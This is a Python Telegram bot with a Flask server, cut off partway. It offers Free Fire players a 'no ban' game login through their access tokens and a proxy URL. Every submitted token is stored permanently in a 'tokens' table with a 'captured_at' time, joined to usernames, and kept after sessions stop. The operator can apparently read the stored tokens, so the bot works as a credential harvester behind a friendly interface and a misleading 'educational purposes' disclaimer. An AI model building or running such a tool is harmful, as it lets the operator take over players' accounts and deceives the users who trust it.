from flask import Flask, request, Response
import requests
import urllib3
import threading
import json
import os
import sqlite3
import asyncio
import time
from datetime import datetime
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "5579476674"))
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "@VISWAxABHI")
DEV_USERNAME = "@HARSHU"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")
PORT = int(os.environ.get("PORT", 5000))
BOT_USERNAME = "@accesstologinbot"

app = Flask(__name__)

MAINTENANCE_MODE = False
sessions = {}
session_lock = threading.Lock()
active_sessions = {}
active_sessions_lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect('bot_data.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    conn = get_db()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            chat_id INTEGER, joined_at TEXT, is_blocked INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, open_id TEXT,
            access_token TEXT UNIQUE, captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, message TEXT, sent_at TEXT, total_sent INTEGER
        )
    """)
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("""
        CREATE TABLE IF NOT EXISTS sessions_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, access_token TEXT, open_id TEXT,
            started_at TEXT, stopped_at TEXT, is_active INTEGER DEFAULT 1
        )
    """)
    c.execute("INSERT INTO config (key, value) VALUES ('maintenance', 'false') ON CONFLICT(key) DO NOTHING")
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO users (user_id, username, first_name, chat_id, joined_at) VALUES (?, ?, ?, ?, ?) ON CONFLICT(user_id) DO NOTHING",
                  (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now()))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error add_user: {e}")

def db_get_user(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_user: {e}"); return None

def db_get_all_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY joined_at DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_users: {e}"); return []

def db_get_total_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_users: {e}"); return 0

def db_save_token(user_id, open_id, access_token):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO tokens (user_id, open_id, access_token, captured_at) VALUES (?, ?, ?, ?) ON CONFLICT(access_token) DO NOTHING",
                  (user_id, open_id, access_token, datetime.now()))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error save_token: {e}"); return False

def db_get_all_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT t.*, u.username, u.first_name FROM tokens t LEFT JOIN users u ON t.user_id = u.user_id ORDER BY t.id DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_tokens: {e}"); return []

def db_get_total_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM tokens")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_tokens: {e}"); return 0

def db_ban_user(user_id, ban=True):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error ban_user: {e}"); return False

def db_save_broadcast(message, total_sent):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO broadcasts (message, sent_at, total_sent) VALUES (?, ?, ?)", (message, datetime.now(), total_sent))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error save_broadcast: {e}")

def db_get_maintenance():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT value FROM config WHERE key = 'maintenance'")
        row = c.fetchone(); conn.close()
        return row and row[0] == 'true'
    except Exception as e:
        print(f"DB Error get_maintenance: {e}"); return False

def db_set_maintenance(status):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO config (key, value) VALUES ('maintenance', ?) ON CONFLICT(key) DO UPDATE SET value = ?",
                  ('true' if status else 'false', 'true' if status else 'false'))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error set_maintenance: {e}")

def db_log_session(user_id, access_token, open_id, started_at, stopped_at=None, is_active=1):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO sessions_log (user_id, access_token, open_id, started_at, stopped_at, is_active) VALUES (?, ?, ?, ?, ?, ?)",
                  (user_id, access_token, open_id, started_at, stopped_at, is_active))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error log_session: {e}")

def db_stop_active_sessions(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE sessions_log SET stopped_at = ?, is_active = 0 WHERE user_id = ? AND is_active = 1", (datetime.now(), user_id))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error stop_sessions: {e}")

def db_get_active_session(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM sessions_log WHERE user_id = ? AND is_active = 1 ORDER BY id DESC LIMIT 1", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_active_session: {e}"); return None

def db_get_user_session_count(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions_log WHERE user_id = ?", (user_id,))
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error session_count: {e}"); return 0

init_database()
MAINTENANCE_MODE = db_get_maintenance()

# ═══════════════════════════════════════════════════════════════
# KEYBOARD
# ═══════════════════════════════════════════════════════════════
def get_keyboard(user_id):
    keyboard = [
        [KeyboardButton("ʟᴏɢɪɴ ɢᴀᴍᴇ"), KeyboardButton("sᴛᴏᴘ sᴇssɪᴏɴ")],
        [KeyboardButton("sᴛᴀᴛᴜs")]
    ]
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ")])
    keyboard.append([KeyboardButton("ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
async def check_sub(user_id, context):
    try:
        m = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return m.status in ["member", "administrator", "creator"]
    except:
        return False

async def join_prompt(update, context):
    kb = [[InlineKeyboardButton("ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
           [InlineKeyboardButton("ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]]
    await update.message.reply_text(
        "<b>ᴊᴏɪɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n\nᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ᴄʜᴀɴɴᴇʟ ғɪʀsᴛ:\n\n<b> • Ꮮᴇᴀᴅᴇʀ Updates ✞</b>\n\nᴀғᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴠᴇʀɪғʏ:",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def start(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = escape(update.effective_user.first_name or "User")
    chat_id = update.effective_chat.id

    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("🔧 <b>Bot Under Maintenance!</b>", parse_mode="HTML")

    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("🚫 <b>You are banned!</b>", parse_mode="HTML")

    if not await check_sub(user_id, context):
        return await join_prompt(update, context)

    db_add_user(user_id, username, first_name, chat_id)
    with session_lock:
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}

    await update.message.reply_html(
    f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
    f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
    f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ sᴜᴄᴄᴇssꜰᴜʟʟʏ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ ᴜsɪɴɢ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ ᴇɴᴊᴏʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs ᴡɪᴛʜ ɴᴏ ʙᴀɴ ɪssᴜᴇ. 100% sᴀꜰᴇ.\n\n"
    f"📌 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
    f"• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ <b>ʟᴏɢɪɴ ɢᴀᴍᴇ</b> ʙᴜᴛᴛᴏɴ\n"
    f"• ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ\n"
    f"• ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n"
    f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ sᴇᴛ ᴜᴘ <code>localconfig.json</code>\n"
    f"• ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    f"• ᴏɴᴄᴇ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    f"ℹ️ <b>ɪᴍᴘᴏʀᴛᴀɴᴛ ɴᴏᴛᴇ</b>\n"
    f"ᴀs ʟᴏɴɢ ᴀs ᴛʜᴇ sᴇssɪᴏɴ ʀᴇᴍᴀɪɴs ᴀᴄᴛɪᴠᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ. ᴏɴᴄᴇ ᴛʜᴇ sᴇssɪᴏɴ ᴇɴᴅs ᴏʀ sᴛᴏᴘs, ʏᴏᴜ ᴡɪʟʟ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɢᴀɪɴ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ ꜰᴏʀ ʟᴏɢɢɪɴɢ ɪɴ.\n\n"
    f"⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
    f"ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴏʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ. ᴋᴇᴇᴘ ɪᴛ ᴘʀɪᴠᴀᴛᴇ.\n\n"
    f"📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ. ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
    f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> @HARSHU",
        reply_markup=get_keyboard(user_id))

async def check_joined_cb(update, context):
    first_name = escape(update.effective_user.first_name or "User")
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if await check_sub(user_id, context):
        db_add_user(user_id, query.from_user.username, query.from_user.first_name, query.message.chat_id)
        with session_lock:
            sessions[str(user_id)] = {"chat_id": query.message.chat_id, "tokens": []}
        await query.message.delete()
        await context.bot.send_message(query.message.chat_id,
    f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
    f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
    f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ sᴜᴄᴄᴇssꜰᴜʟʟʏ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ ᴜsɪɴɢ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ ᴇɴᴊᴏʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs ᴡɪᴛʜ ɴᴏ ʙᴀɴ ɪssᴜᴇ. 100% sᴀꜰᴇ.\n\n"
    f"📌 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
    f"• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ <b>ʟᴏɢɪɴ ɢᴀᴍᴇ</b> ʙᴜᴛᴛᴏɴ\n"
    f"• ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ\n"
    f"• ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n"
    f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ sᴇᴛ ᴜᴘ <code>localconfig.json</code>\n"
    f"• ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    f"• ᴏɴᴄᴇ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    f"ℹ️ <b>ɪᴍᴘᴏʀᴛᴀɴᴛ ɴᴏᴛᴇ</b>\n"
    f"ᴀs ʟᴏɴɢ ᴀs ᴛʜᴇ sᴇssɪᴏɴ ʀᴇᴍᴀɪɴs ᴀᴄᴛɪᴠᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ. ᴏɴᴄᴇ ᴛʜᴇ sᴇssɪᴏɴ ᴇɴᴅs ᴏʀ sᴛᴏᴘs, ʏᴏᴜ ᴡɪʟʟ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɢᴀɪɴ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ ꜰᴏʀ ʟᴏɢɢɪɴɢ ɪɴ.\n\n"
    f"⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
    f"ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴏʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ. ᴋᴇᴇᴘ ɪᴛ ᴘʀɪᴠᴀᴛᴇ.\n\n"
    f"📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
    f"ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ. ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
    f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> @HARSHU",
            parse_mode="HTML", reply_markup=get_keyboard(user_id))
    else:
        kb = [[InlineKeyboardButton(" ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
               [InlineKeyboardButton(" ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]]
        try:
            await query.message.delete()
        except Exception:
            pass
        await context.bot.send_message(query.message.chat_id,
            "<b>ᴊᴏɪɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n\nᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ᴄʜᴀɴɴᴇʟ ғɪʀsᴛ:\n\n<b> • Ꮮᴇᴀᴅᴇʀ Updates ✞</b>\n\nᴀғᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴠᴇʀɪғʏ:",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def handle_buttons(update, context):
    user_id = update.effective_user.id
    text = update.message.text

    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("🔧 <b>Maintenance!</b>", parse_mode="HTML")
    if not await check_sub(user_id, context):
        return await join_prompt(update, context)

    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("❌ Banned.")

    if text == "ʟᴏɢɪɴ ɢᴀᴍᴇ":
        active_session = db_get_active_session(user_id)
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions

        if active_session or has_active:
            with active_sessions_lock:
                si = active_sessions.get(str(user_id), {})
            st = active_session[4] if active_session else si.get("started_at", "Unknown")
            return await update.message.reply_html(
                f"<b>⚠️ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ʟᴏᴄᴋᴇᴅ</b>\n\n"
                f"🕒 <b>Started:</b> <code>{st}</code>\n\n"
                f"ᴘʟᴇᴀsᴇ ᴘʀᴇss <b>sᴛᴏᴘ sᴇssɪᴏɴ</b> ꜰɪʀsᴛ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ ᴏɴᴇ.")

        context.user_data["awaiting_token"] = True
        await update.message.reply_html(
            "<b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴛᴏ ʟᴏɢɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ</b>\n\n"
            "ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b> ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ.\n\n"
            "📝 <b>Send your access token below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>")

    elif text == "sᴛᴏᴘ sᴇssɪᴏɴ":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            if has_active:
                active_sessions.pop(str(user_id), None)

        db_session = db_get_active_session(user_id)
        if not has_active and not db_session:
            return await update.message.reply_html("<b> ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ</b>\n\nʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴʏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ᴛᴏ sᴛᴏᴘ.")

        db_stop_active_sessions(user_id)
        await update.message.reply_html(
            "<b>✅ sᴇssɪᴏɴ sᴛᴏᴘᴘᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ!</b>\n\n"
            "ʏᴏᴜʀ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ.\n"
            "ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ sᴇssɪᴏɴ ʙʏ ᴘʀᴇssɪɴɢ <b>🎮 ʟᴏɢɪɴ ɢᴀᴍᴇ</b>.")

    elif text == "sᴛᴀᴛᴜs":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            si = active_sessions.get(str(user_id), {})

        db_session = db_get_active_session(user_id)
        total_sessions = db_get_user_session_count(user_id)
        total_users = db_get_total_users()
        total_tokens = db_get_total_tokens()

        if db_session:
            status = "🟢 ᴀᴄᴛɪᴠᴇ"
            st = db_session[4]
            tok = db_session[2][:20] + "..." if db_session[2] else "N/A"
            oid = db_session[3] or "N/A"
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S")
                dur = datetime.now() - sd
                h, r = divmod(int(dur.total_seconds()), 3600)
                m, s = divmod(r, 60)
                dur_s = f"{h}h {m}m {s}s"
            except:
                dur_s = "N/A"
        elif has_active and si:
            status = "🟢 ᴀᴄᴛɪᴠᴇ"
            st = si.get("started_at", "Unknown")
            tok = si.get("access_token", "N/A")[:20] + "..." or "N/A"
            oid = si.get("open_id", "N/A")
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S") if st != "Unknown" else None
                if sd:
                    dur = datetime.now() - sd
                    h, r = divmod(int(dur.total_seconds()), 3600)
                    m, s = divmod(r, 60)
                    dur_s = f"{h}h {m}m {s}s"
                else:
                    dur_s = "N/A"
            except:
                dur_s = "N/A"
        else:
            status = "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
            st = "N/A"
            tok = "N/A"
            oid = "N/A"
            dur_s = "N/A"

        await update.message.reply_html(
f"<b>ɢᴀʀᴇɴᴀ ʟᴏɢɪɴ sᴇssɪᴏɴ sᴛᴀᴛᴜs</b>\n\n"
f"<b>sᴛᴀᴛᴜs:</b> {status}\n\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ᴄᴜʀʀᴇɴᴛ sᴇssɪᴏɴ</b>\n"
f" <b>sᴛᴀʀᴛ:</b> <code>{st}</code>\n"
f" <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{dur_s}</code>\n"
f" <b>ᴏᴘᴇɴ ɪᴅ:</b> <code>{oid}</code>\n"
f" <b>ᴛᴏᴋᴇɴ:</b> <code>{tok}</code>\n\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ʏᴏᴜʀ sᴛᴀᴛs</b>\n"
f" <b>sᴇssɪᴏɴs:</b> <code>{total_sessions}</code>\n"
f"━━━━━━━━━━━━━━━\n"
f"<b>ᴛᴏᴛᴀʟ ʙᴏᴛ ᴜsᴇʀs</b>\n"
f" <b>ᴜsᴇʀs:</b> <code>{total_users}</code>"
        )

    elif text == "ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ":
        await update.message.reply_html(
f"<b>🤖 ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n\n"
f"⚡ <b>ᴘᴜʀᴘᴏsᴇ:</b> sɪᴍᴘʟɪꜰɪᴇs ᴛʜᴇ ʟᴏɢɪɴ ᴀɴᴅ sᴇssɪᴏɴ sᴇᴛᴜᴘ ᴘʀᴏᴄᴇss.\n"
f"🔐 <b>ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ:</b> ᴜsᴇs ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ sᴇᴄᴜʀᴇ sᴇssɪᴏɴ.\n"
f"🌐 <b>ᴘʀᴏxʏ:</b> ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ɢᴇɴᴇʀᴀᴛᴇs ᴀ ᴘʀᴏxʏ ᴜʀʟ ꜰᴏʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ.\n"
f"📂 <b>ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ:</b> ᴘʀᴏᴠɪᴅᴇs ʟᴏᴄᴀʟᴄᴏɴꜰɪɢ.ᴊsᴏɴ sᴇᴛᴜᴘ ɪɴsᴛʀᴜᴄᴛɪᴏɴs.\n"
f"📱 <b>ᴘʟᴀᴛꜰᴏʀᴍ sᴜᴘᴘᴏʀᴛ:</b> sᴜᴘᴘᴏʀᴛs ᴍᴜʟᴛɪᴘʟᴇ ʟᴏɢɪɴ ᴘʟᴀᴛꜰᴏʀᴍs.\n"
f"🚀 <b>ɪɴᴛᴇʀꜰᴀᴄᴇ:</b> ꜰᴀsᴛ, sɪᴍᴘʟᴇ, ᴀɴᴅ ᴜsᴇʀ-ꜰʀɪᴇɴᴅʟʏ.\n"
f"🔒 <b>ᴘʀɪᴠᴀᴄʏ:</b> ᴋᴇᴇᴘ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ ᴘʀᴏxʏ ᴜʀʟ ᴘʀɪᴠᴀᴛᴇ.\n"
f"📖 <b>ɴᴏᴛᴇ:</b> ᴜsᴇ ᴛʜɪs ʙᴏᴛ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.\n\n"
f"<b>ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ:</b> @FREEFlRECODE\n"
f"<b>ᴅᴇᴠᴇʟᴏᴘᴇʀ:</b> @HARSHU")

    elif text == "🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ" and user_id == OWNER_ID:
